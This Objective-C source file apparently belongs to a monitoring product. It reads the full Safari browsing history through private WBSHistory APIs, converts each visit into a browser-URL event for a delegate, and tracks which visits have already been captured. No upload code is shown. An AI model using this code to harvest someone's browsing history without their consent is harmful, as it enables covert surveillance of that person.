//
//  BrowserUrlCaptureManager.m
//  BrowserUrlCaptureManager
//
//  Created by Suttiporn Nitipitayanusad on 4/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "BrowserUrlCaptureManager-E.h"
#import "DefStd.h"
#import "EventCenter.h"

#import "DateTimeFormat.h"
#import "WBSHistory.h"
#import "WBSHistorySQLiteStore.h"
#import "WBSHistoryItem.h"
#import "WBSHIstoryVisit.h"

#import "FxBrowserUrlEvent.h"
#import "FxBookmarkEvent.h"

#import "WBSHistoryStoreDelegate.h"

@implementation BrowserUrlCaptureManager
{
    WBSHistorySQLiteStore * mHistoryStore;
    BOOL mLoadingWebHistory;
    BOOL mIsCaptureAllWebHistory;
}

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if (self = [super init]) {
        mEventDelegate = aEventDelegate;
           mHistoryStore = [[WBSHistorySQLiteStore alloc] initWithURL:[WBSHistory historyDatabaseURL] itemCountLimit:1000000 ageLimit:1000000 historyItemClass:[WBSHistoryItem class]];
        mHistoryStore.delegate = self;
	}
	return self;
}

- (void)captureLastWebHistory
{
    if (!mLoadingWebHistory) {
        [mHistoryStore startLoading];
        mLoadingWebHistory = YES;
        mIsCaptureAllWebHistory = NO;
    }
}

- (void) captureWebHistories
{
    if (!mLoadingWebHistory) {
        [mHistoryStore startLoading];
        mLoadingWebHistory = YES;
        mIsCaptureAllWebHistory = YES;
    }
}

#pragma mark -
#pragma mark WBSHistorySQLiteStoreDelegate

- (void)historyLoaderDidFinishLoading:(id)arg1
{
    NSArray *visits = [mHistoryStore _visitsCreatedAfterDate:[NSDate dateWithTimeIntervalSince1970:0] beforeDate:[NSDate date]];
    NSMutableArray *webHistoryArray = [[NSMutableArray alloc] init];

    [visits enumerateObjectsUsingBlock:^(WBSHistoryVisit *historyVisit, NSUInteger idx, BOOL *stop) {
        WBSHistoryItem *historyItem = historyVisit.item;
        
        DLog(@"-------------WEB HISTORY ITEM---------------");
        DLog(@"WBSHistoryItem url %@", historyItem.urlString);
        DLog(@"WBSHistoryItem userVisibleURLString %@", historyItem.userVisibleURLString);
        DLog(@"WBSHistoryItem title %@", historyItem.title);
        DLog(@"WBSHistoryItem lastVisitedDate %@", historyItem.lastVisitedDate);
        DLog(@"WBSHistoryItem visitCount %d", historyItem.visitCount);
        DLog(@"WBSHistoryItem autocompleteTriggers %@", historyItem.autocompleteTriggers);
        
        [webHistoryArray addObject:historyItem];
    }];
    
    [webHistoryArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"lastVisitedDate" ascending:NO]]];
    
    if (webHistoryArray.count > 0) {
        //Process only last web history
        if (!mIsCaptureAllWebHistory) {
            NSInteger lastWebhistoryTimeStamp = -1;
            NSArray *lastWebhistoryIDs = [NSArray array];
            
            NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
            path = [path stringByAppendingPathComponent:@"lastWebHistorys.plist"];
            
            NSFileManager *fileManager = [NSFileManager defaultManager];
            
            if ([fileManager fileExistsAtPath:path]) {
                NSDictionary *lastWebhistorysDic = [NSDictionary dictionaryWithContentsOfFile:path];
                lastWebhistoryTimeStamp = [lastWebhistorysDic[@"lastWebHistoryTimeStamp"] integerValue];
                lastWebhistoryIDs = lastWebhistorysDic[@"lastWebHistoryIDs"];
            }
            
            NSMutableArray *captureWebhistoryIDArray = [NSMutableArray array];
            __block NSInteger captureWebhistoryTimeStamp = -1;
            
            if (lastWebhistoryTimeStamp == -1) {
                WBSHistoryItem *lastWebHistoryItem = [webHistoryArray firstObject];
                FxBrowserUrlEvent *browserUrlEvent = [self createBrowserUrlEventFromWebHistoryItem:lastWebHistoryItem];
                
                if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
                    [mEventDelegate performSelector:@selector(eventFinished:) withObject:browserUrlEvent];
                }
                
                [browserUrlEvent release];
                
                captureWebhistoryTimeStamp = [lastWebHistoryItem.lastVisitedDate timeIntervalSince1970];
                [captureWebhistoryIDArray addObject:[NSNumber numberWithInt:lastWebHistoryItem.databaseID]];
            }
            else {
                [webHistoryArray enumerateObjectsUsingBlock:^(WBSHistoryItem *webHistory, NSUInteger idx, BOOL *stop) {
                    __block BOOL isCaptured = NO;
                    int webhistoryDatabaseID = webHistory.databaseID;
                    
                    if ([webHistory.lastVisitedDate timeIntervalSince1970] >= lastWebhistoryTimeStamp) {
                        [lastWebhistoryIDs enumerateObjectsUsingBlock:^(NSNumber *capturedWebhistoryDatabaseID, NSUInteger idx, BOOL *stop) {
                            if ([capturedWebhistoryDatabaseID intValue] == webhistoryDatabaseID) {
                                isCaptured = YES;
                                *stop = YES;
                            }
                        }];
                        
                        if (!isCaptured) {
                            FxBrowserUrlEvent *browserUrlEvent = [self createBrowserUrlEventFromWebHistoryItem:webHistory];
                            
                            if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
                                [mEventDelegate performSelector:@selector(eventFinished:) withObject:browserUrlEvent];
                            }
                            
                            [browserUrlEvent release];
                            [captureWebhistoryIDArray addObject:[NSNumber numberWithInt:webhistoryDatabaseID]];
                            
                            if (captureWebhistoryTimeStamp == -1 ){
                                captureWebhistoryTimeStamp = [webHistory.lastVisitedDate timeIntervalSince1970];
                            }
                        }
                    }
                }];
            }
            
            if (captureWebhistoryTimeStamp > -1 && captureWebhistoryIDArray.count > 0) {
                NSDictionary *lastWebhistoryDic = @{@"lastWebHistoryTimeStamp": [NSNumber numberWithInteger:captureWebhistoryTimeStamp],
                                                    @"lastWebHistoryIDs" : captureWebhistoryIDArray};
                
                NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
                path = [path stringByAppendingPathComponent:@"lastWebHistorys.plist"];
                
                [lastWebhistoryDic writeToFile:path atomically:YES];
            }
        }
        else {
            //        [webHistoryArray enumerateObjectsUsingBlock:^(WBSHistoryItem *webHistoryItem, NSUInteger idx, BOOL *stop) {
            //            FxBrowserUrlEvent *browserUrlEvent = [[FxBrowserUrlEvent alloc] init];
            //            browserUrlEvent.mTitle = webHistoryItem.title;
            //            browserUrlEvent.mUrl = webHistoryItem.urlString;
            //            browserUrlEvent.mVisitTime = [DateTimeFormat phoenixDateTime:webHistoryItem.lastVisitedDate];
            //            
            //            if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
            //                [mEventDelegate performSelector:@selector(eventFinished:) withObject:browserUrlEvent];
            //            }
            //            
            //            [browserUrlEvent release];
            //        }];
        }
    }

    mLoadingWebHistory = NO;
    [webHistoryArray release];
}

- (void)historyStore:(id)arg1 didPrepareToDeleteWithDeletionPlan:(id)arg2
{
    
}

- (char)historyStoreShouldScheduleMaintenance:(id)arg1
{
    return 1;
}

- (char)historyStoreShouldCheckDatabaseIntegrity:(id)arg1
{
    return 1;
}

- (void)historyLoader:(id)arg1 didLoadItems:(id)arg2 discardedItems:(id)arg3 stringsForUserTypeDomainExpansion:(id)arg4
{
    
}

- (void)historyStoreDidFailDatabaseIntegrityCheck:(id)arg1
{
    
}

- (BOOL)historyStoreShouldRemoveItemsWithURLStringsThatAreNotValidURLs:(id)arg1
{
    return YES;
}

#pragma mark -
#pragma mark Utility

- (FxBrowserUrlEvent *)createBrowserUrlEventFromWebHistoryItem:(WBSHistoryItem *)aWebHistoryItem
{
    FxBrowserUrlEvent *browserUrlEvent = [[FxBrowserUrlEvent alloc] init];
    browserUrlEvent.mTitle = aWebHistoryItem.title;
    browserUrlEvent.mUrl = aWebHistoryItem.urlString;
    browserUrlEvent.mVisitTime = [DateTimeFormat phoenixDateTime:aWebHistoryItem.lastVisitedDate];
    browserUrlEvent.dateTime = [DateTimeFormat phoenixDateTime:aWebHistoryItem.lastVisitedDate];
    browserUrlEvent.mOwningApp = @"Safari";
    browserUrlEvent.mIsBlocked = NO;
    
    NSString *validTitle = [self getValidTitle:[browserUrlEvent mTitle]];
    if (![validTitle isEqualToString:[browserUrlEvent mTitle]]) {
        DLog (@"New url title has been set")
        [browserUrlEvent setMTitle:validTitle];
    }
    
    if (browserUrlEvent.mTitle.length == 0) {
        browserUrlEvent.mTitle = aWebHistoryItem.userVisibleURLString;
    }
    
    return browserUrlEvent;
}

- (NSString *) substring: (NSString*) aString WithNumberOfBytes: (NSInteger) aNumberOfBytes {
    NSData *data  = [aString dataUsingEncoding:NSUTF8StringEncoding];
    NSData *newData = [data subdataWithRange:NSMakeRange(0, aNumberOfBytes)];
    NSString *newString = [[NSString alloc] initWithData:newData encoding:NSUTF8StringEncoding];
    return [newString autorelease];
}

// return modified title in the case that the input title is invalid
// return same title in the case that input title is valid
- (NSString *) getValidTitle: (NSString *) aTitle {
    if (aTitle.length == 0) {
        return @"";
    }
    
    DLog (@"original url title %@", aTitle)				// may be exceed 1 byte
    uint32_t oritinalTitleSize = (uint32_t)[aTitle lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    DLog (@"original title size: %d", oritinalTitleSize)
    
    NSString *newTitle = [NSString stringWithString:aTitle];
    
    if (oritinalTitleSize > 255) {
        NSString *urlStr = aTitle;
        char outputBuffer [256];						// include the space for NULL-terminated string
        NSUInteger usedLength = 0;
        NSRange remainingRange = NSMakeRange(0, 0);
        NSRange range = NSMakeRange(0, [urlStr length]);
        
        
        if ([urlStr getBytes:outputBuffer				// The returned bytes are not NULL-terminated.
                   maxLength:255
                  usedLength:&usedLength
                    encoding:NSUTF8StringEncoding
                     options:NSStringEncodingConversionAllowLossy
                       range:range
              remainingRange:&remainingRange]) {
            outputBuffer[usedLength] = '\0';				// add NULL terminated string
            
            newTitle = [[NSString alloc] initWithCString:outputBuffer encoding:NSUTF8StringEncoding];
            [newTitle autorelease];
            
            DLog(@"new title 1st approach: %@ size:%lu usedLength %lu remainLOC: %lu remainLEN %lu",
                 newTitle,
                 (unsigned long)[newTitle lengthOfBytesUsingEncoding:NSUTF8StringEncoding],
                 (unsigned long)usedLength,
                 (unsigned long)remainingRange.location,
                 (unsigned long)remainingRange.length);
        } else {
            DLog(@"!!!!! can not get byte from this bookmark");
            newTitle = [self substring:urlStr WithNumberOfBytes:255];
            if (!newTitle) {
                newTitle = [self substring:urlStr WithNumberOfBytes:254];
                if (!newTitle) {			
                    newTitle = [self substring:urlStr WithNumberOfBytes:253];
                    if (!newTitle) {		
                        newTitle = [self substring:urlStr WithNumberOfBytes:252];
                    }
                }				
            }			
            DLog(@"newTitle 2nd approach: %@", newTitle);
        }	
    }	
    return newTitle;	
}

#pragma mark - Clear Util

+ (void)clearCapturedData
{
    // Remove last capture time stemp for each event
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    
    //Call log
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastWebHistorys.plist"] error:&error]) {
        DLog(@"Remove last web history plist error with %@", [error localizedDescription]);
    }
}

#pragma mark -
#pragma mark Dealloc

- (void) dealloc {
    [mHistoryStore dealloc];
    mHistoryStore = nil;
	[super dealloc];
}

@end
